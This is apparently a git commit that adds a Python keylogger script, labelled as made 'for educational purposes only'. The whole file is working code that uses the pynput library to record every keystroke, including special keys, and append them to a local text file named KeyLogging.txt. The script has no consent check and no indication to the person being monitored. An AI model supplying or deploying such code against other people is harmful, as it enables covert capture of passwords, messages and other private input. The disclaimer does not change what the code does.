778d59fcc4cfaa130831bb91ea8bab324f9f5347
Carson Piwowarczyk <111904658+capiwowarczyk@users.noreply.github.com>
2025-03-31 17:47:50 -0600

    Create PythonKeylogger.py
    DISCLAIMER!!! THIS IS MADE FOR EDUCATIONAL PURPOSES ONLY

---
+++ PythonKeylogger.py
@@ -0,0 +1,19 @@
+#THIS IS ONLY MADE FOR EDUCATIONAL PURPOSES ONLY!!!!!
+#This is my python keylogger 
+
+#Importing the propper libary in order to make the program run
+from pynput.keyboard import Key, Listener
+
+
+def on_press(key):
+    try: #This will log your normal alphanuemeric keys
+        with open("KeyLogging.txt", "a") as file:
+            file.write(f"{key.char}")
+
+    except AttributeError: #This logs special charaters seperatly
+        
+        with open("KeyLogging.txt", "a") as file:
+            file.write(f" [{key}] ")
+
+with Listener(on_press=on_press) as listener:
+    listener.join() #This keeps the program running and captures keystrokes continuously
